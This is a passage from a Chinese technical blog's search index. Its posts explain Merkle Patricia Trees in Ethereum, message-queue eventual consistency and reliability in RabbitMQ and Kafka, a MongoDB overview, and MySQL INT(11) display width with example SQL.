\u0026lt;\u0026gt;, \u0026lt;\u0026gt;, hashC, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt; ] hashC: [ \u0026lt;20 6f 72 73 65\u0026gt;, 'stallion' ] hashB: [ \u0026lt;00 6f\u0026gt;, hashD ] hashD: [ \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, hashE, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, 'verb' ] hashE: [ \u0026lt;17\u0026gt;, hashF ] hashF: [ \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, hashG, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, 'puppy' ] hashG: [ \u0026lt;35\u0026gt;, 'coin' ] 构造过程为 假设插入第一个kv对是do-\u0026gt;verb，key根据Hex-Prefix编码为[‘0x20’, ‘0x64’, ‘0x6f’]，MPT树为：\n 假设插入第一个kv对是do-\u0026gt;verb，key根据Hex-Prefix编码为[‘0x20’, ‘0x64’, ‘0x6f’]，MPT树为：  叶子节点\n接着插入第二个kv对dog-\u0026gt;puppy，dog和do的公共前缀为[‘64’, ‘6f’]，do是叶子结点A，将叶子结点替换成扩展节点A，并将新key与叶子节点A的公共前缀(646f)作为扩展节点的key，扩展节点的value是新分支节点B的hash值，然后将do和dog剩余的key插入到分支节点中，由于do没有剩余的key，则将对应的value写入分支节点B的value中，dog剩余的key为67，则分支节点B中的路径为6，指向叶子结点C。7为dog剩下的最后一个key值，是奇数叶子结点则前缀为3，所有最终的MPT树为：  叶子节点插入\n再插入第三个kv对doge-\u0026gt;coin，按照上面的步骤生成的MPT树是：  最后插入第四个kv对horse-\u0026gt;stallion，horse与其它key的公共前缀只有6，则将扩展节点A新增一个分支节点F作为其孩子节点，将新key与扩展节点A的公共前缀6作为扩展节点A的key，A是扩展节点并且key为奇数，所以前缀为1，value为新增分支节点F的hash。原扩展节点A变成新扩展节点之后剩余的key，与新key剩下的key，插入到分支节点F中，分别放入4和8中，4指向新的扩展节点G，8指向叶子节点H。最终的MPT树为：  MPT在以太坊中的应用 Merkle数据结构在区块链领域中使用比较广泛，比特币和以太坊都是用了Merkle树，其中以太坊中保留了三颗MPT，分别是状态树、交易树和收据树，这三种树可以帮助以太坊客户端做一些简易的查询，如查询某个账户的余额、某笔交易是否被包含在区块中等。\n需要注意的是在以太坊中对MPT再进行了一次封装，对数据项的key进行了一次哈希计算sha3(key)，value进行了RLP(Recursive length prefix encoding,递归长度前缀编码)编码，数据库中存储额外的sha3(key)与key之间的对应关系。\n原文链接： http://bigdatadecode.club/Merkle-Patricia-Tree.html ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/block-chain/merkle-patricia-treempt/","series":["Manual"],"tags":["BlockChain"],"title":"Merkle Patricia Tree"},{"categories":["编程思想"],"content":"MongoDB综述 参考 项目实战 MongoDB快速入门，掌握这些刚刚好！ mall整合Mongodb实现文档操作 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mongodb/mongodb%E7%BB%BC%E8%BF%B0/","series":["Manual"],"tags":["MongoDB"],"title":"MongoDB综述"},{"categories":["编程思想"],"content":"只有RocketMQ支持事务消息，如果我们的MQ不是RocketMQ，可以采用本地消息+MQ达到同样的效果，并且本地消息表还可以做出独立的服务。\n随着分布式服务架构的流行与普及，原来在单体应用中执行的多个逻辑操作，现在被拆分成了多个服务之间的远程调用。虽然服务化为我们的系统带来了水平伸缩的能力，然而随之而来挑战就是分布式事务问题，多个服务之间使用自己单独维护的数据库，它们彼此之间不在同一个事务中，假如A执行成功了，B执行却失败了，而A的事务此时已经提交，无法回滚，那么最终就会导致两边数据不一致性的问题；尽管很早之前就有基于两阶段提交的XA分布式事务，但是这类方案因为需要资源的全局锁定，导致性能极差；因此后面就逐渐衍生出了消息最终一致性、TCC等柔性事务的分布式事务方案，本文主要分析的是基于消息的最终一致性方案。\n0\\. 简单RPC处理存在的一致性问题 在正式开始讲述正题之前，我们先看一下，不依赖任何分布式事务手段，单纯将本地业务逻辑和远程调用逻辑放在同一个本地事务中会有什么问题。\n我们以订单创建为例，订单系统先创建订单(本地事务)，然后RPC调用库存扣减服务。\n@Transactionnal public void processOrder() { try{ // 订单处理(业务操作)  orderService.process(); // 库存扣减（RPC远程调用）  storageService.deduction(); }catch(Exception e){ 事务回滚; } } 如果库存服务由于DB数据量比较大，导致处理超时，订单服务在出现超时异常后，直接回滚本地事务，从而导致订单服务这边没数据，而库存服务那边数据却已经写入了，最终导致两边业务数据的不一致。\n即使不存在 “DB数据量比较大” 这种特殊情况，也一定会存在因为网络抖动，订单服务调用库存服务超时而本地回滚，但是库存服务实际操作成功的情况。\n其根本的原因就在于：远程调用，结果最终可能为成功、失败、超时；而对于超时的情况，处理方最终的结果可能是成功，也可能是失败，调用方是无法知晓的。\n1\\. 普通消息的处理流程  消息生成者发送消息 MQ收到消息，将消息进行持久化，在存储中新增一条记录 返回ACK给生产者 MQ push 消息给对应的消费者，然后等待消费者返回ACK 如果消息消费者在指定时间内成功返回ack，那么MQ认为消息消费成功，在存储中删除消息，即执行第6步；如果MQ在指定时间内没有收到ACK，则认为消息消费失败，会尝试重新push消息,重复执行4、5、6步骤 MQ删除消息  1.2 普通消息处理存在的一致性问题 我们还是以订单创建为例，订单系统先创建订单(本地事务)，再发送消息给下游处理；如果订单创建成功，然而消息没有发送出去，那么下游所有系统都无法感知到这个事件，会出现脏数据；\npublic void processOrder() { // 订单处理(业务操作)  orderService.process(); // 发送订单处理成功消息(发送消息)  sendBizMsg (); } 如果先发送订单消息，再创建订单；那么就有可能消息发送成功，但是在订单创建的时候却失败了，此时下游系统却认为这个订单已经创建，也会出现脏数据。\npublic void processOrder() { // 发送订单处理成功消息(发送消息)  sendBizMsg (); // 订单处理(业务操作)  orderService.process(); } 1.3 一个错误的想法 此时可能有同学会想，我们可否将消息发送和业务处理放在同一个本地事务中来进行处理，如果业务消息发送失败，那么本地事务就回滚，这样是不是就能解决消息发送的一致性问题呢?\n@Transactionnal public void processOrder() { try{ // 订单处理(业务操作)  orderService.process(); // 发送订单处理成功消息(发送消息)  sendBizMsg (); }catch(Exception e){ 事务回滚; } } 这种做法的错误在于，如果订单处理成功，消息成功存储到MQ，但是MQ处理超时，从而ACK确认失败，导致发送方本地事务回滚。 势必造成消息生产者与消费者数据状态不一致。\n2\\. 事务消息 由于传统的处理方式无法解决消息生成者本地事务处理成功与消息发送成功两者的一致性问题，因此事务消息就诞生了，它实现了消息生成者本地事务与消息发送的原子性，保证了消息生成者本地事务处理成功与消息发送成功的最终一致性问题。\n2.1 事务消息处理的流程  事务消息与普通消息的区别就在于消息生产环节，生产者首先预发送一条消息到MQ(这也被称为发送half消息) MQ接受到消息后，先进行持久化，则存储中会新增一条状态为待发送的消息 然后返回ACK给消息生产者，此时MQ不会触发消息推送事件 生产者预发送消息成功后，执行本地事务 执行本地事务，执行完成后，发送执行结果给MQ MQ会根据结果删除或者更新消息状态为可发送 如果消息状态更新为可发送，则MQ会push消息给消费者，后面消息的消费和普通消息是一样的  注意点：由于MQ通常都会保证消息能够投递成功，因此，如果业务没有及时返回ACK结果，那么就有可能造成MQ的重复消息投递问题。因此，对于消息最终一致性的方案，消息的消费者必须要对消息的消费支持幂等，不能造成同一条消息的重复消费的情况。\n2.2 支持事务消息的MQ 现在目前较为主流的MQ，比如ActiveMQ、RabbitMQ、Kafka、RocketMQ等，只有RocketMQ支持事务消息。据笔者了解，早年阿里对MQ增加事务消息也是因为支付宝那边因为业务上的需求而产生的。因此，如果我们希望强依赖一个MQ的事务消息来做到消息最终一致性的话，在目前的情况下，技术选型上只能去选择RocketMQ来解决。上面我们也分析了事务消息所存在的异常情况，即MQ存储了待发送的消息，但是MQ无法感知到上游处理的最终结果。对于RocketMQ而言，它的解决方案非常的简单，就是其内部实现会有一个定时任务，去轮训状态为待发送的消息，然后给producer发送check请求，而producer必须实现一个check监听器，监听器的内容通常就是去检查与之对应的本地事务是否成功(一般就是查询DB)，如果成功了，则MQ会将消息设置为可发送，否则就删除消息。\n由于并非所有的MQ都支持事务消息，假如我们不选择RocketMQ来作为系统的MQ，是否能够做到消息的最终一致性呢？答案是可以的。\n3\\. 基于本地消息表的最终一致性 基于本地消息的最终一致性方案的最核心做法就是在执行业务操作的时候，记录一条消息数据到DB，并且消息数据的记录与业务数据的记录必须在同一个事务内完成，这是该方案的前提核心保障。在记录完成后消息数据后，后面我们就可以通过一个定时任务到DB中去轮训状态为待发送的消息，然后将消息投递给MQ。这个过程中可能存在消息投递失败的可能，此时就依靠重试机制来保证，直到成功收到MQ的ACK确认之后，再将消息状态更新或者消息清除；而后面消息的消费失败的话，则依赖MQ本身的重试来完成，其最后做到两边系统数据的最终一致性。基于本地消息服务的方案虽然可以做到消息的最终一致性，但是它有一个比较严重的弊端，每个业务系统在使用该方案时，都需要在对应的业务库创建一张消息表来存储消息。针对这个问题，我们可以将该功能单独提取出来，做成一个消息服务来统一处理，因而就衍生出了我们下面将要讨论的方案。\n4\\. 独立消息服务的最终一致性 独立消息服务最终一致性与本地消息服务最终一致性最大的差异就在于将消息的存储单独地做成了一个RPC的服务，这个过程其实就是模拟了事务消息的消息预发送过程，如果预发送消息失败，那么生产者业务就不会去执行，因此对于生产者的业务而言，它是强依赖于该消息服务的。不过好在独立消息服务支持水平扩容，因此只要部署多台，做成HA的集群模式，就能够保证其可靠性。在消息服务中，还有一个单独地定时任务，它会定期轮训长时间处于待发送状态的消息，通过一个check补偿机制来确认该消息对应的业务是否成功，如果对应的业务处理成功，则将消息修改为可发送，然后将其投递给MQ；如果业务处理失败，则将对应的消息更新或者删除即可。因此在使用该方案时，消息生产者必须同时实现一个check服务，来供消息服务做消息的确认。对于消息的消费，该方案与上面的处理是一样，都是通过MQ自身的重发机制来保证消息被消费。\n参考 MQ消息最终一致性解决方案 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mq/mq%E6%B6%88%E6%81%AF%E6%9C%80%E7%BB%88%E4%B8%80%E8%87%B4%E6%80%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","series":["Manual"],"tags":["MQ"],"title":"MQ消息最终一致性解决方案"},{"categories":["编程思想"],"content":"1. 概念  Broker Producer Consumer Topic Queue Message  2. 模式 2.1. 点对点 PTP 点对点: 使用 Queue 作为通信载体\n消息生产者生产消息发送到 Queue 中，然后消息消费者从 Queue 中取出并且消费消息。消息被消费以后，Queue 中不再存储，所以消息消费者不可能消费到已经被消费的消息。Queue 支持存在多个消费者，但是对一个消息而言，只会有一个消费者可以消费\n2.2. 发布/订阅 Pub/Sub 发布订阅(广播): 使用 Topic 作为通信载体\n消息生产者(发布)将消息发布到 Topic 中，同时有多个消息消费者(订阅)消费该消息。和点对点方式不同，发布到 Topic 的消息会被所有订阅者消费\n总结 Queue 实现了负载均衡，将 Producer 生产的消息发送到消息队列中，由多个消费者消费。但一个消息只能被一个消费者接受，当没有消费者可用时，这个消息会被保存直到有一个可用的消费者\nTopic 实现了发布和订阅，当你发布一个消息，所有订阅这个 Topic 的服务都能得到这个消息，所以从1到N个订阅者都能得到一个消息的拷贝\n3. 协议 3.1. AMQP协议 AMQP 即 Advanced Message Queuing Protocol ，一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品，不同开发语言等条件的限制。兼容 JMS。RabbitMQ 就是基于 AMQP 协议实现的。\n优点：可靠、通用\n JMS（JAVA Message Service,java 消息服务）是 java 的消息服务，JMS 的客户端之间可以通过 JMS 服务进行异步的消息传输。JMS（JAVA Message Service，Java 消息服务）API 是一个消息服务的标准或者说是规范，允许应用程序组件基于 JavaEE 平台创建、发送、接收和读取消息。它使分布式通信耦合度更低，消息服务更加可靠以及异步性。\nActiveMQ 就是基于 JMS 规范实现的。\nJMS vs AMQP\n   对比方向 JMS AMQP     定义 Java API 协议   跨语言 否 是   跨平台 否 是   支持消息类型 提供两种消息模型：①Peer-2-Peer;②Pub/sub 提供了五种消息模型：①direct exchange；②fanout exchange；③topic change；④headers exchange；⑤system exchange。本质来讲，后四种和 JMS 的 pub/sub 模型没有太大差别，仅是在路由机制上做了更详细的划分；   支持消息类型 支持多种消息类型 ，我们在上面提到过 byte[]（二进制）     3.2. MQTT协议 MQTT（Message Queuing Telemetry Transport，消息队列遥测传输）是 IBM 开发的一个即时通讯协议，有可能成为物联网的重要组成部分。该协议支持所有平台，几乎可以把所有联网物品和外部连接起来，被用来当做传感器和致动器（比如通过 Twitter 让房屋联网）的通信协议。\n优点：格式简洁、占用带宽小、移动端通信、PUSH、嵌入式系统\n3.3. STOMP协议 STOMP（Streaming Text Orientated Message Protocol）是流文本定向消息协议，是一种为 MOM（Message Oriented Middleware，面向消息的中间件）设计的简单文本协议。STOMP 提供一个可互操作的连接格式，允许客户端与任意 STOMP 消息代理（Broker）进行交互。\n优点：命令模式（非 Topic\\Queue 模式）\n3.4. XMPP协议 XMPP（可扩展消息处理现场协议，Extensible Messaging and Presence Protocol）是基于可扩展标记语言（XML）的协议，多用于即时消息（IM）以及在线现场探测。适用于服务器之间的准即时操作。核心是基于XML流传输，这个协议可能最终允许因特网用户向因特网上的其他任何人发送即时消息，即使其操作系统和浏览器不同。\n优点：通用公开、兼容性强、可扩展、安全性高，但 XML 编码格式占用带宽大\n3.5. 基于TCP/IP自定义的协议 有些特殊框架（如：Redis、Kafka、ZeroMq等）根据自身需要未严格遵循 MQ 规范，而是基于 TCP\\IP 自行封装了一套协议，通过网络 Socket 接口进行传输，实现了 MQ 的功能\n4. 优点 4.1. 解耦 4.2. 异步 4.3. 削峰 5. 缺点  系统可用性降低。在系统中引入 MQ，那么万一 MQ 挂了怎么办呢？一般而言，引入的外部依赖越多，系统越脆弱，每一个依赖出问题都会导致整个系统的崩溃 系统复杂度提高。需要考虑 MQ 的各种情况，比如：消息的重复消费、消息丢失、保证消息传递的顺序性等等 数据一致性问题。比如 A 系统已经给客户返回操作成功，这时候操作 BC 都成功了，操作 D 却失败了，导致数据不一致  6. F\u0026Q 6.1 如何保证消息队列的高可用？ 6.1.1 RabbitMQ 的高可用性 RabbitMQ 有三种模式：单机模式、普通集群模式、镜像集群模式。\n1. 单机模式 无高可用。\n2. 普通集群模式 无高可用性。\n普通集群模式，意思就是在多台机器上启动多个 RabbitMQ 实例，每个机器启动一个。你创建的 queue，只会放在一个 RabbitMQ 实例上，但是每个实例都同步 queue 的元数据（元数据可以认为是 queue 的一些配置信息，通过元数据，可以找到 queue 所在实例）。你消费的时候，实际上如果连接到了另外一个实例，那么那个实例会从 queue 所在实例上拉取数据过来。\n这种方式确实很麻烦，也不怎么好，没做到所谓的分布式，就是个普通集群。因为这导致你要么消费者每次随机连接一个实例然后拉取数据，要么固定连接那个 queue 所在实例消费数据，前者有数据拉取的开销，后者导致单实例性能瓶颈。\n而且如果那个放 queue 的实例宕机了，会导致接下来其他实例就无法从那个实例拉取，如果你开启了消息持久化，让 RabbitMQ 落地存储消息的话，消息不一定会丢，得等这个实例恢复了，然后才可以继续从这个 queue 拉取数据。\n所以这个事儿就比较尴尬了，这就没有什么所谓的高可用性，这方案主要是提高吞吐量的，就是说让集群中多个节点来服务某个 queue 的读写操作。\n3. 镜像集群模式 有高可用性。\n这种模式，才是所谓的 RabbitMQ 的高可用模式。跟普通集群模式不一样的是，在镜像集群模式下，你创建的 queue，无论元数据还是 queue 里的消息都会存在于多个实例上，就是说，每个 RabbitMQ 节点都有这个 queue 的一个完整镜像，包含 queue 的全部数据的意思。然后每次你写消息到 queue 的时候，都会自动把消息同步到多个实例的 queue 上。\n这样的话，好处在于，你任何一个机器宕机了，没事儿，其它机器（节点）还包含了这个 queue 的完整数据，别的 consumer 都可以到其它节点上去消费数据。坏处在于，第一，这个性能开销也太大了吧，消息需要同步到所有机器上，导致网络带宽压力和消耗很重！第二，这么玩儿，不是分布式的，就没有扩展性可言了，如果某个 queue 负载很重，你加机器，新增的机器也包含了这个 queue 的所有数据，并没有办法线性扩展你的 queue。你想，如果这个 queue 的数据量很大，大到这个机器上的容量无法容纳了，此时该怎么办呢？\n6.1.2 Kafka 的高可用性 Kafka有partition的概念，每个topic可以划分为多个partition。每个 partition 的数据都会同步到指定数量的其它机器上，形成自己的多个 replica 副本。\n所有 replica 会选举一个 leader 出来，那么生产和消费都跟这个 leader 打交道，然后其他 replica 就是 follower。写的时候，leader 会负责把数据同步到所有 follower 上去，读的时候就直接读 leader 上的数据即可。只能读写 leader？很简单，要是你可以随意读写每个 follower，那么就要 care 数据一致性的问题，系统复杂度太高，很容易出问题。\n如果这个宕机的 broker 上面有某个 partition 的 leader，那么此时会从 follower 中重新选举一个新的 leader 出来，大家继续读写那个新的 leader 即可。这就有所谓的高可用性了。\n写数据的时候，生产者就写 leader，然后 leader 将数据落地写本地磁盘，接着其他 follower 自己主动从 leader 来 pull 数据。一旦所有 follower 同步好数据了，就会发送 ack 给 leader，leader 收到所有 follower 的 ack 之后，就会返回写成功的消息给生产者。（当然，这只是其中一种模式，还可以适当调整这个行为）\n消费的时候，只会从 leader 去读，但是只有当一个消息已经被所有 follower 都同步成功返回 ack 的时候，这个消息才会被消费者读到。\n6.2 如何保证消息不被重复消费？ 如何保证消息不被重复消费？或者说，如何保证消息消费的幂等性？\n例如：kafka有offset的概念，如果消费者已经消费了消息，但是还没提交对应位置offset的时候应用发生重启，重启之后继续消费就有可能发生重复消费。\n再例如：也有可能是生产者重复发送消息导致重复消费，例如：RabbitMQ生产者为了保证消息不被丢失而开启了comfirm模式，如果生产者成功发送消息 👉 RabbitMQ成功处理保存了消息 👉 但是因为网络抖动生产者没有收到RabbitMQ的回复ack 👉 生产者重发消息 👉 最终该消息发了两次😔\n解决问题的方式有如下三种思路\n 如果消息是做数据库的插入操作，给这个消息做一个唯一主键，那么就算出现重复消费的情况，就会导致主键冲突，避免数据库出现脏数据 如果你拿到这个消息做 Redis 的 Set 的操作，不用解决，因为你无论 Set 几次结果都是一样的，Set 操作本来就算幂等操作 如果上面两种情况还不行，准备一个第三服务方来做消费记录。以 Redis 为例，给消息分配一个全局 ID，只要消费过该消息，将 \u0026lt;Id,Message\u0026gt; 以 K-V 形式写入 Redis。那消费者开始消费前，先去 Redis 中查询有没消费记录即可  6.3 如何保证消息的可靠性传输？ 如何保证消息的可靠性传输？或者说，如何处理消息丢失的问题？\n6.3.1 RabbitMQ 1. 生产者弄丢了数据 事务 或者 confirm机制\n生产者将数据发送到 RabbitMQ 的时候，可能数据就在半路给搞丢了，因为网络问题啥的，都有可能。\n此时可以选择用 RabbitMQ 提供的事务功能，就是生产者发送数据之前开启 RabbitMQ 事务 channel.txSelect ，然后发送消息，如果消息没有成功被 RabbitMQ 接收到，那么生产者会收到异常报错，此时就可以回滚事务 channel.txRollback ，然后重试发送消息；如果收到了消息，那么可以提交事务 channel.txCommit 。\n// 开启事务 channel.txSelect try { // 这里发送消息 } catch (Exception e) { channel.txRollback // 这里再次重发这条消息 } // 提交事务 channel.txCommit 但是问题是，RabbitMQ 事务机制（同步）一搞，基本上吞吐量会下来，因为太耗性能。\n所以一般来说，如果你要确保说写 RabbitMQ 的消息别丢，可以开启 confirm 模式，在生产者那里设置开启 confirm 模式之后，你每次写的消息都会分配一个唯一的 id，然后如果写入了 RabbitMQ 中，RabbitMQ 会给你回传一个 ack 消息，告诉你说这个消息 ok 了。如果 RabbitMQ 没能处理这个消息，会回调你的一个 nack 接口，告诉你这个消息接收失败，你可以重试。而且你可以结合这个机制自己在内存里维护每个消息 id 的状态，如果超过一定时间还没接收到这个消息的回调，那么你可以重发。\n事务机制和 confirm 机制最大的不同在于，事务机制是同步的，你提交一个事务之后会阻塞在那儿，但是 confirm 机制是异步的，你发送个消息之后就可以发送下一个消息，然后那个消息 RabbitMQ 接收了之后会异步回调你的一个接口通知你这个消息接收到了。\n所以一般在生产者这块避免数据丢失，都是用 confirm 机制的。\n2. RabbitMQ 弄丢了数据 开启 RabbitMQ 的持久化，持久化可以跟生产者那边的 confirm 机制配合起来，只有消息被持久化到磁盘之后，才会通知生产者 ack 了，所以哪怕是在持久化到磁盘之前，RabbitMQ 挂了，数据丢了，生产者收不到 ack ，你也是可以自己重发的。\n3. 消费端弄丢了数据 关闭 RabbitMQ 的自动 ack ，然后每次你自己代码里确保处理完的时候，再在程序里 ack 一把。这样的话，如果你还没处理完，不就没有 ack 了？那 RabbitMQ 就认为你还没处理完，这个时候 RabbitMQ 会把这个消费分配给别的 consumer 去处理，消息是不会丢的。\n6.3.2 Kafka 1. 消费端弄丢了数据 跟RabbitMQ 差不多，关闭自动提交offset。\n2. Kafka 弄丢了数据 partition follower 还有些数据没有同步，结果此时 leader 挂了，然后选举某个 follower 成 leader 之后，不就少了一些数据？\n此时一般是要求起码设置如下 4 个参数：\n 给 topic 设置 replication.factor 参数：这个值必须大于 1，要求每个 partition 必须有至少 2 个副本。 在 Kafka 服务端设置 min.insync.replicas 参数：这个值必须大于 1，这个是要求一个 leader 至少感知到有至少一个 follower 还跟自己保持联系，没掉队，这样才能确保 leader 挂了还有一个 follower 吧。 在 producer 端设置 acks=all ：这个是要求每条数据，必须是写入所有 replica 之后，才能认为是写成功了。 在 producer 端设置 retries=MAX （很大很大很大的一个值，无限次重试的意思）：这个是要求一旦写入失败，就无限重试，卡在这里了。  3. 生产者会不会弄丢数据？ 如果按照上述的思路设置了 acks=all ，一定不会丢，要求是，你的 leader 接收到消息，所有的 follower 都同步到了消息之后，才认为本次写成功了。如果没满足这个条件，生产者会自动不断的重试，重试无限次。\n6.4 如何保证消息的顺序性？ Rabbitmq：\n 一个 Queue，一个 Consumer，内部单线程消费，单线程吞吐量太低，一般不会用这个； 拆分多个 Queue，生产者把相同的key消息放入同一个Queue，每个 Queue一个 Consumer，就是多一些 Queue 而已，确实是麻烦点； 或者就一个 Queue 但是对应一个 Consumer，Consumer把相同的key消息放入内存 queue，每个内存 queue对应一个Worker线程 第2第3结合使用  Kafka：\n  一个 Topic，一个 Partition，一个 Consumer，内部单线程消费，单线程吞吐量太低，一般不会用这个；\n  生产者把相同的key消息放入同一个Kafka Partition，每个Partition对应一个Consumer，Consumer把相同的key消息放入内存 queue，每个内存 queue对应一个Worker线程\n  6.5 如何设计消息队列？  支持可伸缩性，参照一下 kafka 的设计理念，broker -\u0026gt; topic -\u0026gt; partition，每个 partition 放一个机器，就存一部分数据。如果现在资源不够了，简单啊，给 topic 增加 partition，然后做数据迁移，增加机器，不就可以存放更多数据，提供更高的吞吐量了？ 保证消息不会丢失，持久化、顺序写；与生产者配合，支持消息发生 事务 或 comfirm 机制，达到数据 0 丢失。 高可用，集群模式，少数broker挂掉了，MQ还能继续工作。参考kafka 的高可用保障机制，多副本 -\u0026gt; leader \u0026amp; follower -\u0026gt; broker 挂了重新选举 leader 即可对外服务。  6.6 数据是通过 Push 还是 Pull 方式给到消费端，各自有什么弊端  Push 模型实时性好，但是因为状态维护等问题，难以应用到消息中间件的实践中，因为在 Broker 端需要维护 Consumer 的状态，不好适用于 Broker 去支持大量的 Consumer 的场景 Consumer 的消费速度是不一致的，Broker 进行推送难以处理不同的 Consumer 的状况，Broker 难以应对 Consumer 无法消费消息的情况，因为不知道 Consumer 的宕机是短暂的还是永久的，另外推送消息（量可能会很大）也会加重 Consumer 的负载或者压垮 Consumer，如果对应只有 1 个 Consumer，用 Push 比 Pull 好 Pull 模式实现起来会相对简单一些，但是实时性取决于轮训的频率，在对实时性要求高的场景不适合使用  7. 对比    特性 ActiveMQ RabbitMQ RocketMQ Kafka     单机吞吐量 万级，吞吐量比RocketMQ和Kafka要低一个数量级 万级，吞吐量比RocketMQ和Kafka要低一个数量级 十万级，RocketMQ也是可以支撑高吞吐的一种MQ 十万级别，Kafka最大优点就是吞吐量大，一般配合大数据类的系统来进行实时数据计算、日志采集等场景   Topic数量对吞吐量的影响 - - Topic可以达到几百、几千个的级别，吞吐量会有小幅度的下降。这是RocketMQ的一大优势，可在同等数量机器下支撑大量的Topic Topic从几十个到几百个的时候，吞吐量会大幅下降。所以在同等机器数量下，Kafka尽量保证Topic数量不要过多。如果支撑大规模Topic需要增加更多的机器   时效性 ms级 微秒级，这是rabbitmq的一大特点，延迟是最低的 ms级 延迟在ms级以内   可用性 高，基于主从架构实现可用性 高，基于主从架构实现可用性 非常高，分布式架构 非常高，Kafka是分布式的，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用   消息可靠性 有较低的概率丢失数据 - 经过参数优化配置，可以做到零丢失 经过参数配置，消息可以做到零丢失   功能支持 MQ领域的功能及其完备 基于erlang开发，所以并发性能极强，性能极好，延时低 MQ功能较为完备，分布式扩展性好 功能较为简单，主要支持加单MQ功能   优势 非常成熟，功能强大，在业内大量公司和项目中都有应用 erlang语言开发，性能极好、延时很低，吞吐量万级、MQ功能完备，管理界面非常好，社区活跃；互联网公司使用较多 接口简单易用，阿里出品有保障，吞吐量大，分布式扩展方便、社区比较活跃，支持大规模的Topic、支持复杂的业务场景，可以基于源码进行定制开发 超高吞吐量，ms级的时延，极高的可用性和可靠性，分布式扩展方便   劣势 偶尔有较低概率丢失消息，社区活跃度不高 吞吐量较低，erlang语音开发不容易进行定制开发，集群动态扩展麻烦 接口不是按照标准JMS规范走的，有的系统迁移要修改大量的代码，技术有被抛弃的风险 有可能进行消息的重复消费   应用 主要用于解耦和异步，较少用在大规模吞吐的场景中 都有使用 用于大规模吞吐、复杂业务中 在大数据的实时计算和日志采集中被大规模使用，是业界的标准    参考 MQ了解及对比选型 advanced-java ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mq/mq%E7%BB%BC%E8%BF%B0/","series":["Manual"],"tags":["MQ"],"title":"MQ综述"},{"categories":["编程思想"],"content":"1.介绍 Integer类型，即整数类型，MySQL支持的整数类型有TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT。\n1.1 空间和范围 每种整数类型所需的存储空间和范围如下：\n   类型 字节 最小值(有符号) 最大值(有符号) 最小值(无符号) 最大值(无符号)     TINYINT 1 -128 127 0 255   SMALLINT 2 -32768 32767 0 65535   MEDIUMINT 3 -8388608 8388607 0 16777215   INT 4 -2147483648 2147483647 0 4294967295   BIGINT 8 $-2^{63}$(-9223372036854775808) $2^{63}-1$(9223372036854775807) 0 $2^{64}-1$(18446744073709551615)    2. INT(11) 2.1 数字是否限制长度？ id INT(11) NOT NULL AUTO_INCREMENT, 在一些建表语句会出现上面 int(11) 的类型，那么其代表什么意思呢？\n对于Integer类型括号中的数字称为字段的显示宽度。这与其他类型字段的含义不同。对于DECIMAL类型，表示数字的总数。对于字符字段，这是可以存储的最大字符数，例如VARCHAR（20）可以存储20个字符。\n显示宽度并不影响可以存储在该列中的最大值。INT(5) 和 INT(11)可以存储相同的最大值。哪怕设置成 INT(20) 并不意味着将能够存储20位数字(BIGINT)，该列还是只能存储INT的最大值。\n示例 创建一个临时表：\nCREATE TEMPORARY TABLE demo_a ( id INT(11) NOT NULL AUTO_INCREMENT, a INT(1) NOT NULL, b INT(5) NOT NULL, PRIMARY KEY (`id`) ) 插入超过\u0026quot;长度\u0026quot;的数字：\nINSERT INTO demo_a(a,b) VALUES(255, 88888888); 查看结果：发现数字并不是设置长度\nmysql\u0026gt; SELECT * FROM demo_a; +----+-----+----------+ | id | a | b | +----+-----+----------+ | 1 | 255 | 88888888 | +----+-----+----------+ 1 row in set (0.03 sec) 2.2 数字表达什么意思 当列设置为UNSIGNED ZEROFILL时，INT(11)才有意义，其表示的意思为如果要存储的数字少于11个字符，则这些数字将在左侧补零。\n注意：ZEROFILL默认的列为无符号，因此不能存储负数。\n示例 创建一个临时表：b列设置为UNSIGNED ZEROFILL\nCREATE TEMPORARY TABLE demo_a ( id INT(11) NOT NULL AUTO_INCREMENT, a INT(11) NOT NULL, b INT(11) UNSIGNED ZEROFILL NOT NULL, PRIMARY KEY (`id`) ); 插入数值：\nINSERT INTO demo_a(a,b) VALUES(1, 1); 结果：b列的左侧使用了0填充长度\nmysql\u0026gt; SELECT * FROM demo_a; +----+---+-------------+ | id | a | b | +----+---+-------------+ | 1 | 1 | 00000000001 | +----+---+-------------+ 1 row in set (0.18 sec) 参考 MySQL Integer类型与INT(11) ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/mysql-integer%E7%B1%BB%E5%9E%8B%E4%B8%8Eint11/","series":["Manual"],"tags":["MySQL"],"title":"MySQL Integer类型与INT(11)"},{"categories":["编程思想"],"content":"参考 MySQL 前缀索引 前缀索引，一种优化索引大小的解决方案 